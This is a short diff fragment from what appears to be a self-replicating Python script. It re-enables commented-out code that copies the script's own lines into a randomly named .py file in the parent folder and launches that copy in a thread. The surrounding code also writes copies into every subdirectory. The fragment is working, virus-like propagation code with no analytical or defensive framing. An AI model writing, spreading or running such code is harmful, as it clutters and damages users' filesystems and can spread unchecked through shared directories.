@@ -58,15 +58,15 @@ f.close()
 filename = "newpython{randomness}.py".format(randomness="".join(random.choices(string.ascii_lowercase + string.digits, k=5)))
 
 #start copying the contents of the files to the new one
-#if os.access("..\\", os.W_OK):
-#    print("..\\" + filename)
-#    h = open("..\\" + filename, "w")
-#    previousFolder(h, lines)
-#    h.write('\n#{chaos}'.format(chaos="".join(random.choices(string.ascii_lowercase + string.digits, k=5))))
-#    h.close()
-#    if os.path.isfile("..\\" + filename):
-#        thread = Thread(target=runFunc("..\\" + filename))
-#        thread.start()
+if os.access("..\\", os.W_OK):
+    print("..\\" + filename)
+    h = open("..\\" + filename, "w")
+    previousFolder(h, lines)
+    h.write('\n#{chaos}'.format(chaos="".join(random.choices(string.ascii_lowercase + string.digits, k=5))))
+    h.close()
+if os.path.isfile("..\\" + filename):
+    thread = Thread(target=runFunc("..\\" + filename))
+    thread.start()
 
 for x in os.walk(directory):
     g = open(x[0] + "/" + filename, "w")
